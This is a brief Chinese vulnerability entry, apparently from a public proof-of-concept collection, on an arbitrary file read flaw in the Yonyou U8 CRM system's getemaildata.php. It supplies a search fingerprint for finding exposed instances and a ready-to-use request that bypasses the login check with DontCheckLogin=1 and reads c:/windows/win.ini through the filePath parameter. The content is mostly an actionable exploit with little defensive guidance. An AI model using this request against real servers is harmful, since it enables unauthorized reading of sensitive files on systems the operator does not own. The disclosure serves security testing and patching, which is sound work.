# 用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞

## 漏洞描述

用友 U8 CRM客户关系管理系统 getemaildata.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取到服务器中的敏感文件

## 漏洞影响

<a-checkbox checked>用友 U8 CRM客户关系管理系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>web.body="用友U8CRM"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1680525831431-a143a41a-f89e-4132-913f-0f0e8858628c-20230812123820985.png)

验证POC

```plain
/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini
```

![img](../../../.vuepress/public/img/1691568204155-1b46ce98-e317-4318-9fb3-f2bcad3b0988.png)